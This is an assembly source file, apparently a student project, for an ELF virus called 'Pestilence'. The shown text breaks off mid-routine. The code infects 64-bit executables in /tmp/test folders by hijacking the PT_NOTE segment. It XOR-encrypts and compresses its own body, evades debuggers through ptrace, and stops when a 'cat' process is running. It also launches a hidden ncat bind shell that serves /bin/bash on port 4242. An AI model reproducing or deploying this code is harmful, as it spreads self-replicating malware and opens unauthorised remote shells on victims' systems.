%include "main.inc"

section .text

_start:
	nop
	; https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
begin:
	; save all registers
	push rax
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r8
	push r9
	push r10
	push r11

	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local compressed_data_size:qword					; long compressed_data_size;
	%xdefine compressed_data rbp - %$localsize - COMPRESSION_BUF_SIZE	; uint8_t compressed_data[COMPRESSION_BUF_SIZE]
	%assign %$localsize %$localsize + COMPRESSION_BUF_SIZE			; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov rax, SYS_CLONE				; _pid = clone(
	mov rdi, CLONE_VFORK				; 	CLONE_VFORK,
	xor rsi, rsi					; 	0,
	xor rdx, rdx					; 	0,
	xor r10, r10					; 	0
	syscall						; );
	cmp rax, 0					; if (_pid < 0)
	jl .skipped					; 	goto .skipped;
	je .child					; else if (_pid == 0) goto .child;
	jmp .skipped					; else goto .skipped;

.child:
	call can_run_infection				; if (can_run_infection() == 0)
	cmp rax, 0					; 	goto exit;
	je exit						; ...

	; Set arguments of compression/decompression function
	lea rdi, [compressed_data_size]			; _compressed_data_size_ptr = &compressed_data_size;
	lea rsi, [compressed_data]			; _compressed_data = compressed_data;

	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
	cmp rax, 0x0					; ...
	je .compress					; 	goto .compress
	jmp .decompress					; else goto .decompress
.compress:
	call compression				; compression(_compressed_data_size_ptr, _compressed_data);
	jmp .end_compress				; goto .end_compress
.decompress:
	call decompression				; decompression(_compressed_data_size_ptr, _compressed_data);
	jmp .end_compress				; goto .end_compress
.end_compress:

	mov rdi, [compressed_data_size]			; infection_routine (compressed_data_size, _real_begin_compressed_data_ptr);
	lea rsi, [compressed_data]			; ...
	add rsi, COMPRESSION_BUF_SIZE			; /* Ugly thing because of arbitraty COMPRESSION_BUF_SIZE
	sub rsi, rdi					; ... */
	call infection_routine				; ...
	jmp exit

.skipped:
	add rsp, %$localsize
	pop rbp
	%pop

	; restore all registers
	pop r11
	pop r10
	pop r9
	pop r8
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
	pop rax

	jmp jmp_instr

; int can_run_infection();
; rax can_run_infection();
can_run_infection:
; .end_uncipher block will disappear at compilation, and replaced by a magic_key,
; result of xor between the two following blocks
.begin_mixed_code:
.begin_anti_debugging:
	mov rax, SYS_PTRACE				; _ret = ptrace(
	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
	xor rsi, rsi					; 	0,
	xor rdx, rdx					; 	0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .debugged					; 	goto .debugged;

	call check_process				; _ret = check_process();
	cmp rax, 1					; if (_ret == !)
	je .process					; 	goto .process;
.end_anti_debugging:

.begin_uncipher:
	lea rdi, [rel infection_routine]		; data = &infection_routine
	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
	lea rdx, [rel key]				; key = key
	mov rcx, key_size				; key_size = key_size
	call xor_cipher					; xor_cipher(data, size, key, key_size)
	jmp .valid					; goto .valid
.end_uncipher:
.end_mixed_code:

	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
	cmp rax, 0x0					; ...
	je .valid					; 	goto .valid;
	lea rdi, [rel .begin_mixed_code]		; _data = &.begin_mixed_code;
	mov rsi, .end_mixed_code - .begin_mixed_code	;_size = .end_mixed_code - .begin_mixed_code;
	lea rdx, [rel magic_key]			; _key = &magic_key;
	mov rcx, magic_key_size				; _key_size = magic_key_size;
	call xor_cipher					; xor_cipher(_data, _size, _key, _key_size);

	jmp .begin_mixed_code				; goto .begin_mixed_code

	.valid:
		mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
		cmp rax, 0x0					; ...
		je .end						; 	goto .end;
		lea rdi, [rel .begin_mixed_code]		; _data = &.begin_mixed_code;
		mov rsi, .end_mixed_code - .begin_mixed_code	;_size = .end_mixed_code - .begin_mixed_code;
		lea rdx, [rel magic_key]			; _key = &magic_key;
		mov rcx, magic_key_size				; _key_size = magic_key_size;
		call xor_cipher					; xor_cipher(_data, _size, _key, _key_size);
	.end:
		mov rax, 1					; return 1;
		ret

	.debugged:
		lea rdi, [rel debugged_message]		; print_string(debugged_message);
		call print_string			; ...
		xor rax, rax				; return 0;
		ret

	.process:
		lea rdi, [rel process_message]		; print_string(process_message);
		call print_string			; ...
		xor rax, rax				; return 0;
		ret


; int check_process();
; rax check_process();
check_process:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local fd:qword					; long fd;
	%local cur_offset:qword				; long cur_offset;
	%local read_bytes:qword				; long read_bytes;
	%local cur_dirent:qword				; void *cur_dirent;
	%local file_fd:qword				; long file_fd;
	%local result:qword				; long result;
	%xdefine proc_buffer rbp - %$localsize - BUFFER_SIZE	; uint8_t proc_buffer[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE		; ...
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
	%xdefine file_buf rbp - %$localsize - BUFFER_SIZE	; uint8_t file_buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov byte [result], 0					; result = 0;

	mov byte [proc_buffer], 0x2F			; proc_buffer = "/proc/";
	mov byte [proc_buffer + 1], 0x70		; ...
	mov byte [proc_buffer + 2], 0x72		; ...
	mov byte [proc_buffer + 3], 0x6F		; ...
	mov byte [proc_buffer + 4], 0x63		; ...
	mov byte [proc_buffer + 5], 0x2F		; ...
	mov byte [proc_buffer + 6], 0			; ...

	mov rax, SYS_OPEN				; _ret = open(
	lea rdi, [proc_buffer]				; folder_name,
	mov rsi, O_RDONLY				; O_RDONLY,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

.begin_getdents_loop:					; while (true) {
	mov rax, SYS_GETDENTS64				; _ret = SYS_GETDENTS64(
	mov rdi, [fd]					; 	fd,
	lea rsi, [buf]					; 	buf,
	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
	syscall						; );

	cmp rax, 0					; if (_ret <= 0)
	jle .end_getdents_loop				;	 break;
	mov [read_bytes], rax				; read_bytes = _ret;

	xor rax, rax					; cur_offset = 0;
	mov [cur_offset], rax				; ...

.begin_treate_loop:					; do {
	lea rax, [buf]					; cur_dirent = buf + cur_offset;
	add rax, [cur_offset]				; ...
	mov [cur_dirent], rax				; ...

	lea rdi, [proc_buffer]				; buf = proc_buffer;
	add rdi, 6					; buf += 6;
	mov rsi, [cur_dirent]				; name = cur_dirent->d_name;
	add rsi, linux_dirent64.d_name			; ...

	.concat:					; buf += name;
		mov al, [rsi]				; ... c = *name;
		cmp al, 0				; ... if (c == 0)
		je .end_concat				; ... 	goto .end_concat
		mov [rdi], al				; ... *buf = c;
		inc rdi					; ... buf++;
		inc rsi					; ... name++;
		jmp .concat				; ... goto .concat

	.end_concat:

	mov byte [rdi], 0x2F				; buf += '/comm'
	mov byte [rdi + 1], 0x63			; ...
	mov byte [rdi + 2], 0x6F			; ...
	mov byte [rdi + 3], 0x6D			; ...
	mov byte [rdi + 4], 0x6D			; ...
	mov byte [rdi + 5], 0				; ...

	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
	add rax, linux_dirent64.d_reclen		; ...
	xor rdi, rdi					; _reclen = *_reclen_ptr;
	mov di, [rax]					; ...
	add [cur_offset], rdi				; cur_offset += _reclen;

	mov rax, SYS_OPEN				; _ret = open(
	lea rdi, [proc_buffer]				; buf,
	mov rsi, O_RDONLY				; O_RDONLY,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .continue					; 	goto .continue
	mov [file_fd], rax				; file_fd = _ret;

	mov rax, SYS_READ				; _ret = read(
	mov rdi, [file_fd]				; 	file_fd,
	lea rsi, [file_buf]				; 	file_buf,
	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
	syscall						; );
	cmp rax, 4					; if (_ret != 4)
	jne .close_file					; 	goto .close_file

	mov al, [file_buf]				; if (file_buf[0] != 'c')
	cmp al, 'c'					; ...
	jne .close_file					; 	goto .close_file

	mov al, [file_buf + 1]				; if (file_buf[1] != 'a')
	cmp al, 'a'					; ...
	jne .close_file					; 	goto .close_file

	mov al, [file_buf + 2]				; if (file_buf[2] != 't')
	cmp al, 't'					; ...
	jne .close_file					; 	goto .close_file

	mov al, [file_buf + 3]				; if (file_buf[3] != '\n')
	cmp al, 0x0A					; ...
	jne .close_file					; 	goto .close_file

	mov byte [result], 1				; result = 1;

	.close_file:
		mov rax, SYS_CLOSE			; close(file_fd);
		mov rdi, [file_fd]			; ...
		syscall					; ...

.continue:
	mov rax, [cur_offset]				; } while (cur_offset == read_bytes);
	cmp rax, [read_bytes]				; ...
	je .end_treate_loop				; ...
	jmp .begin_treate_loop				; ...
.end_treate_loop:					; ...

	jmp .begin_getdents_loop
.end_getdents_loop:					; }

	; Close folder
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	mov rax, [result]				; return result;
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; void print_string(char const *str);
; void print_string(rdi str);
print_string:
	push rdi					; save str
	xor rdx, rdx					; _len = 0;
	.begin_strlen_loop:				; while (true) {
		mov sil, [rdi]				; _c = *_str;
		cmp sil, 0				; if (_c == 0)
		je .end_strlen_loop			; 	break;
		inc rdx					; _len++
		inc rdi					; _str++;
		jmp .begin_strlen_loop			; }
	.end_strlen_loop:				; ...
	pop rsi						; load str
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	syscall						;	str, _len);
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	push 0x0A					; 	'\n',
	mov rsi, rsp					; 	...
	mov rdx, 1					; 	1
	syscall						; );
	add rsp, 8					; unpop '\n'

	ret

; void xor_cipher(char *data, int size, char *key, int key_size);
; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
xor_cipher:
	push rcx					; save key_size
	push rdx					; save key

	.loop:
		cmp rsi, 0				; if (size == 0)
		je .end					; 	goto .end

		mov al, [rdi]				; al = *data
		mov bl, [rdx]				; bl = *key
		xor al, bl				; al ^= bl
		mov [rdi], al				; *data = al

		inc rdi					; data++
		inc rdx					; key++
		dec rsi					; size--
		dec rcx					; key_size--

		cmp rcx, 0				; if (key_size == 0)
		je .key_reset				; 	goto .key_reset

		jmp .loop				; goto .loop

	.key_reset:
		mov rdx, [rsp]				; restore key
		mov rcx, [rsp + 8]			; ...
		jmp .loop				; goto .loop

	.end:
		pop rdx					; reset stack
		pop rcx					; ...
		ret					; return

; void decompression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
; void decompression(rdi compressed_data_size_ptr, rsi compressed_data_ptr);
decompression:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local compressed_data_size_ptr:qword		; long *compressed_data_size_ptr;
	%local compressed_data_ptr:qword		; uint8_t *compressed_data_ptr;
	%local cur_src:qword				; uint8_t *cur_src;
	%local cur_dest:qword				; uint8_t *cur_dest;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [compressed_data_size_ptr], rdi		; compressed_data_size_ptr = _compressed_data_size_ptr;
	mov [compressed_data_ptr], rsi			; compressed_data_ptr = _compressed_data_ptr;

	mov rax, [rel compressed_data_size2]		; *compressed_data_size_ptr = compressed_data_size2;
	mov [rdi], rax					; ...

	; Save compressed data for infected
	lea rsi, [rel infection_routine]		; _src = infection_routine;
	mov rdi, [compressed_data_ptr]			; _dest = compressed_data_ptr;
	add rdi, COMPRESSION_BUF_SIZE			;  + COMPRESSION_BUF_SIZE
	sub rdi, [rel compressed_data_size2]		;  - compressed_data_size2
	mov rcx, [rel compressed_data_size2]		; _count = compressed_data_size2;
	rep movsb					; memcpy(_dest, _src, _count);

	lea rax, [rel infection_routine]		; cur_src = infection_routine + compressed_data_size2 - 1 ;
	add rax, [rel compressed_data_size2]		; ...
	dec rax						; ...
	mov [cur_src], rax				; ...
	lea rax, [rel _end - 1]				; cur_dest = _end - 1;
	mov [cur_dest], rax				; ...

.decompression_routine:
	lea rax, [rel infection_routine]		; while (! (cur_src == infection_routine - 1)) {
	dec rax						; ...
	cmp [cur_src], rax				; ...
	je .end_decompression_routine			; ...

	mov rsi, [cur_src]				; if (*cur_src == COMPRESSION_TOKEN)
	mov r8b, [rsi]					; ...
	cmp r8b, COMPRESSION_TOKEN			; ...
	je .decompress_token				; 	goto .decompress_token
	mov rdi, [cur_dest]				; *cur_dest = *cur_src;
	mov [rdi], r8b					; ...
	dec qword [cur_src]				; cur_src--;
	dec qword [cur_dest]				; cur_dest--;
	jmp .decompression_routine			; continue;
.decompress_token:
	mov rax, [cur_src]				; _n_lookback = *--cur_src;
	sub rax, 1					; ...
	cmp byte [rax], 0				; if (_n_lookback == 0)
	je .decompress_byte_token			;	goto .decompress_byte_token
	xor rsi, rsi					; _pattern_ptr = _n_lookback + cur_dest;
	mov sil, [rax]					; ...
	add rsi, [cur_dest]				; ...
	mov rdi, [cur_dest]				; _dest = cur_dest;

	xor rcx, rcx					; _count = *--_cur_src;
	sub rax, 1					; ...
	mov cl, [rax]

	; Get src data before writing. It can causes problems in case of overlapping of dest and src
	xor r8, r8					; _count_save = _count;
	mov r8b, cl					; ...

	std						; reverse_memcpy(_dest, _src, _count);
	rep movsb					; ...
	cld						; ...

	sub qword [cur_src], 3				; cur_src -= 3;
	sub [cur_dest], r8				; cur_dest -= _count_save;

	jmp .decompression_routine			; continue;

.decompress_byte_token:
	mov rdi, [cur_dest]				; *cur_dest = COMPRESSION_TOKEN;
	mov byte [rdi], COMPRESSION_TOKEN		; ...
	dec qword [cur_dest]				; cur_dest--;
	sub qword [cur_src], 2				; cur_src -= 2;
	jmp .decompression_routine			; continue;
							; } // while
.end_decompression_routine:
	add rsp, %$localsize
	pop rbp
	%pop

	ret

jmp_instr:
	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
							; or to next instruction if original virus
exit:
	mov rax, SYS_EXIT				; exit(
	xor rdi, rdi					; 0
	syscall						; );

; BEGIN FAKE .data SECTION
infected_folder_1: db "/tmp/test/", 0
infected_folder_2: db "/tmp/test2/", 0
elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
len_elf_64_magic: equ $ - elf_64_magic
compressed_data_size2: dq 0x00				; Filled in infected
key: db "S3cr3tK3y"
key_size: equ $ - key
debugged_message: db "DEBUG DETECTED ;)", 0
process_message: db "Process detected ;)", 0
dev_null: db "/dev/null", 0
nc_command: db "/usr/bin/ncat", 0
nc_arg1: db "ncat", 0
nc_arg2: db "-l", 0
nc_arg3: db "-p", 0
nc_arg4: db "4242", 0
nc_arg5: db "-e", 0
nc_arg6: db "/bin/bash", 0
magic_key: db 0x00					; Will be replaced by a script
magic_key_size: equ $ - magic_key
; never used but here to be copied in the binary
signature: db "Pestilence v1.0 by jmaia and dhubleur", 0
; END FAKE .data SECTION

; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
; void infection_routine(rdi _compressed_data_size, rsi _real_begin_compressed_data_ptr)
infection_routine:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local compressed_data_size:qword		; long compressed_data_size;
	%local real_begin_compressed_data_ptr:qword	; uint8_t *real_begin_compressed_data_ptr
	%xdefine nc_args rbp - %$localsize - 7*8	; char *nc_args[7];
	%assign %$localsize %$localsize + 7*8		; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [compressed_data_size], rdi			; compressed_data_size = _compressed_data_size;
	mov [real_begin_compressed_data_ptr], rsi	; real_begin_compressed_data_ptr = _real_begin_compressed_data_ptr;

	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1, compressed_data_size, _real_begin_compressed_data_ptr);
	mov rsi, [compressed_data_size]			; ...
	mov rdx, [real_begin_compressed_data_ptr]	; ...
	call treate_folder				; ...
	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2, compressed_data_size, _real_begin_compressed_data_ptr);
	mov rsi, [compressed_data_size]			; ...
	mov rdx, [real_begin_compressed_data_ptr]	; ...
	call treate_folder				; ...

	mov rax, SYS_FORK				; _ret = fork();
	syscall						; );
	cmp rax, 0					; if (_ret == 0)
	je .child					; 	goto .child
	jmp .parent					; else goto .parent

	.child:
		mov rax, SYS_OPEN			; _ret = open(
		lea rdi, [rel dev_null]			; 	"/dev/null",
		mov rsi, O_RDWR				; 	O_RDWR,
		xor rdx, rdx				; 	0
		syscall					; );
		cmp rax, 0				; if (_ret < 0)
		jl .child_end				; 	goto .child_end
		push rax

		mov rdi, rax				; dup2(_ret, 1);
		mov rax, SYS_DUP2			; ...
		mov rsi, 1				; ...
		syscall					; );
		pop rdi
		push rdi
		mov rax, SYS_DUP2			; dup2(_ret, 2);
		mov rsi, 2				; ...
		syscall					; );

		lea rdi, [rel nc_command]		; execve(nc_command,
		
		lea rsi, [nc_args]			; [nc_args[0], nc_args[1], nc_args[2], nc_args[3], nc_args[4], nc_args[5], nc_args[6], NULL]
		lea rdx, [rel nc_arg1]	
		mov [rsi], rdx
		lea rdx, [rel nc_arg2]
		mov [rsi + 8], rdx
		lea rdx, [rel nc_arg3]
		mov [rsi + 16], rdx
		lea rdx, [rel nc_arg4]
		mov [rsi + 24], rdx
		lea rdx, [rel nc_arg5]
		mov [rsi + 32], rdx
		lea rdx, [rel nc_arg6]
		mov [rsi + 40], rdx
		xor rdx, rdx
		mov [rsi + 48], rdx
		
		xor rdx, rdx				; NULL
		mov rax, SYS_EXECVE			; ...
		syscall					; );

		.child_close:
			mov rax, SYS_CLOSE		; close(_ret);
			pop rdi				; ...
			syscall				; ...

		.child_end:
			mov rax, SYS_EXIT		; exit(0);
			xor rdi, rdi			; ...
			syscall				; ...

	.parent:
		add rsp, %$localsize
		pop rbp
		%pop
		ret

; void treate_folder(char const *_folder, long _compressed_data_size, uint8_t *_compressed_data_ptr);
; void treate_folder(rdi folder, rsi _compressed_data_size, rdx _compressed_data_ptr);
treate_folder:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local folder:qword				; char const *folder;
	%local fd:qword					; long fd;
	%local cur_offset:qword				; long cur_offset;
	%local read_bytes:qword				; long read_bytes;
	%local cur_dirent:qword				; void *cur_dirent;
	%local compressed_data_size:qword		; long compressed_data_size;
	%local compressed_data_ptr:qword		; uint8_t *compressed_data_ptr;
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [folder], rdi				; folder = _folder;
	mov [compressed_data_size], rsi			; compressed_data_size = _compressed_data_size;
	mov [compressed_data_ptr], rdx			; compressed_data_ptr = _compressed_data_ptr;

	; Open folder
	mov rax, SYS_OPEN				; _ret = open(
	mov rdi, [folder]				; folder_name,
	mov rsi, O_RDONLY				; O_RDONLY,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

.begin_getdents_loop:					; while (true) {
	mov rax, SYS_GETDENTS64				; _ret = SYS_GETDENTS64(
	mov rdi, [fd]					; 	fd,
	lea rsi, [buf]					; 	buf,
	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
	syscall						; );

	cmp rax, 0					; if (_ret <= 0)
	jle .end_getdents_loop				;	 break;
	mov [read_bytes], rax				; read_bytes = _ret;

	xor rax, rax					; cur_offset = 0;
	mov [cur_offset], rax				; ...

.begin_treate_loop:					; do {
	lea rax, [buf]					; cur_dirent = buf + cur_offset;
	add rax, [cur_offset]				; ...
	mov [cur_dirent], rax				; ...

	mov rdi, [folder]				; treat_file(folder,
	mov rsi, [cur_dirent]				; 	cur_dirent
	add rsi, linux_dirent64.d_name			; 		->d_name,
	mov rdx, [compressed_data_size]			;	compressed_data_size,
	mov rcx, [compressed_data_ptr]			;	compressed_data_ptr;
	call treat_file					; );

	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
	add rax, linux_dirent64.d_reclen		; ...
	xor rdi, rdi					; _reclen = *_reclen_ptr;
	mov di, [rax]					; ...
	add [cur_offset], rdi				; cur_offset += _reclen;

	mov rax, [cur_offset]				; } while (cur_offset == read_bytes);
	cmp rax, [read_bytes]				; ...
	je .end_treate_loop				; ...
	jmp .begin_treate_loop				; ...
.end_treate_loop:					; ...

	jmp .begin_getdents_loop
.end_getdents_loop:					; }

	; Close folder
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; void treat_file(char const *_dirname, char const *_filename, long _compressed_data_size, uint8_t *_compressed_data_ptr);
; void treat_file(rdi dirname, rsi filename, rdx _compressed_data_size, rcx _compressed_data_ptr);
treat_file:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local dirname:qword				; char const *dirname;
	%local filename:qword				; char const *file;
	%local filepath:qword				; char *filepath;
	%local fd:qword					; long fd;
	%local filesize:qword				; long filesize;
	%local mappedfile:qword				; void *mappedfile;
	%local payload_offset:qword			; long payload_offset;
	%local new_vaddr:qword				; Elf64_addr new_vaddr;
	%local payload_size:qword			; long payload_size;
	%local offset_to_sub_mmap:qword			; long offset_to_sub_mmap;
	%local compressed_data_size:qword		; long compressed_data_size;
	%local compressed_data_ptr:qword		; long compressed_data_ptr;
	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
	%assign %$localsize %$localsize + PATH_MAX	; ...
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [dirname], rdi				; dirname = _dirname;
	mov [filename], rsi				; filename = _filename;
	mov [compressed_data_size], rdx			; compressed_data_size = _compressed_data_size;
	mov [compressed_data_ptr], rcx			; compressed_data_ptr = _compressed_data_ptr;

	xor r8, r8					; len = 0;
	lea rdi, [pathbuf]				; dest = pathbuf;
	mov rsi, [dirname]				; src = dirname;
	.dirname:
		inc r8					; len++;
		cmp r8, PATH_MAX			; if (len == PATH_MAX)
		je .end					; 	goto .end;
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .dirname				; 	goto .dirname;

	mov rsi, [filename]				; src = filename;
	.filename:
		inc r8					; len++;
		cmp r8, PATH_MAX			; if (len == PATH_MAX)
		je .end					; 	goto .end;
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .filename				; 	goto .filename;

	mov byte [rdi], 0				; *dest = 0;


	; Open file
	mov rax, SYS_OPEN				; _ret = open(
	lea rdi, [pathbuf]				; path,
	mov rsi, O_RDWR					; O_RDWR,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

	; Get file stat
	lea rsi, [buf]					; _stat = buf;
	mov rax, SYS_FSTAT				; _ret = fstat(
	mov rdi, [fd]					; 	fd,
	syscall						; _stat);
	cmp rax, -1					; if (_ret == -1)
	je .close_file					; 	goto .close_file

	add rsi, stat.st_size				; filesize = _stat->st_size;
	mov rax, [rsi]					; ...
	mov [filesize], rax				; ...
	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
	jl .close_file					; 	goto .close_file

	; Reserve file size + payload size (for PT_NOTE method)
	; https://stackoverflow.com/questions/15684771/how-to-portably-extend-a-file-accessed-using-mmap
	mov rax, SYS_MMAP				; _ret = mmap(
	xor rdi, rdi					; 	0,
	mov rsi, [filesize]				; 	filesize
	add rsi, infection_routine - _start		;	  + (infection_routine - _start)
	add rsi, [compressed_data_size]			;	  + compressed_data_size
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
	mov r8, -1					; 	-1,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_file					; 	goto .close_file
	mov [mappedfile], rax				; mappedfile = _ret;

	; Map file
	mov rax, SYS_MMAP				; _ret = mmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize,
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
	mov r8, [fd]					; 	fd,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_file					; 	goto .close_file
	mov [mappedfile], rax				; mappedfile = _ret;

	; Check if file is an ELF 64
	mov rdi, [mappedfile]				; is_elf_64(mappedfile);
	call is_elf_64					; ...
	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
	jne .unmap_file					; 	goto .unmap_file

	; Check if file has a signature
	mov rdi, [mappedfile]				; if (has_signature(mappedfile) == 1)
	call has_signature				; ...
	cmp rax, 1					; ...
	je .unmap_file					; 	goto .unmap_file

	mov rax, [filesize]				; payload_offset = filesize;
	mov [payload_offset], rax			; ...
	mov rdi, [mappedfile]				; _new_vaddr = get_next_available_vaddr(mappedfile);
	call get_next_available_vaddr			; ...

	; Align new_vaddr to offset in file such as offset = vaddr % PAGE_SIZE
	mov rdi, [payload_offset]			; _offset_from_page = payload_offset;
	and rdi, OFFSET_FROM_PAGE_MASK			; _offset_from_page &= OFFSET_FROM_PAGE_MASK
	add rax, rdi					; _injected_segment_start += _offset_from_page;
	mov [new_vaddr], rax				; new_vaddr = _new_vaddr;

	mov rdi, _end - _start				; payload_size = _end - _start;
	mov [payload_size], rdi				; ...

	mov rdi, [mappedfile]				; ret = convert_pt_note_to_load(mappedfile,
	mov rsi, [payload_offset]			; payload_offset,
	mov rdx, [new_vaddr]				; next_vaddr,
	mov rcx, infection_routine - _start		; (infection_routine - _start)
	add rcx, [compressed_data_size]			;   + compressed_data_size
	mov r8, [payload_size]				; payload_size,
	call convert_pt_note_to_load			; );
	cmp rax, 0					; if (ret == 0)
	je .unmap_file					; 	goto .unmap_file

	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
	mov rdi, [fd]					; fd,
	mov rsi, [filesize]				; filesize
	add rsi, infection_routine - _start		; + (infection_routine - _start)
	add rsi, [compressed_data_size]			; + compressed_data_size
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .unmap_file					; 	goto .unmap_file

	; Get address of the start of the current page
	xor rdx, rdx					; _offset = old_filesize / page_size
	mov rax, [filesize]				; ...
	mov rdi, PAGE_SIZE				; ...
	div rdi						; ...
	mul rdi						; _offset *= page_size;
	mov [offset_to_sub_mmap], rax			; offset_to_sub_mmap = _offset;
	mov rdi, [mappedfile]				; _addr = mapped_file
	add rdi, rax					; _addr += _offset

	mov rax, SYS_MMAP				; _ret = mmap(
							;	_addr,
	mov rsi, [filesize]				; 	filesize
	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
	add rsi, infection_routine - _start		;	  + (infection_routine - _start)
	add rsi, [compressed_data_size]			;	  + compressed_data_size
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
	mov r8, [fd]					; 	fd,
	mov r9, [offset_to_sub_mmap]			;	offset_to_sub_mmap
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .unmap_file					; 	goto .unmap_file

	mov rdi, [mappedfile]				; _dest = file_map;
	add rdi, [filesize]				; _dest += filesize;
	mov byte [rdi], 0x90				; *_dest = 0x90; //nop instruction

	; copy all bytes between begin and infection_routine to the segment
	mov rdi, [mappedfile]				; _dest = file_map + filesize + 1;
	add rdi, [filesize]				; ...
	inc rdi						; ...
	lea rsi, [rel begin]				; _src = begin;
	mov rcx, infection_routine - begin		; _len = infection_routine - begin;
	rep movsb					; memcpy(_dest, _src, _len);

	; copy all compressed bytes between infection_routine and _end to the segment
	mov rdi, [mappedfile]				; _dest = file_map
	add rdi, [filesize]				; 	+ filesize
	add rdi, infection_routine - _start		; 	+ (infection_routine - _start);
	mov rsi, [compressed_data_ptr]			; _src = compressed_data_ptr;
	mov rcx, [compressed_data_size]			; _len = compressed_data_size;
	rep movsb					; memcpy(_dest, _src, _len);

	; compute jmp_value
	mov rdi, [mappedfile]				; _jmp_value = file_map
	add rdi, elf64_hdr.e_entry			; 	->e_entry;
	mov eax, [rdi]					; ...

	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;
	sub eax, jmp_instr - _start			; _jmp_value -= jmp_instr - _start;
	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction

	; change jmp_value in injected code
	mov rdi, [mappedfile]				; _jmp_value_ptr = file_map
	add rdi, [filesize]				; 	+ filesize
	add rdi, jmp_instr - _start			; 	+ (jmp_instr - _start)
	inc rdi						; 	+ 1;
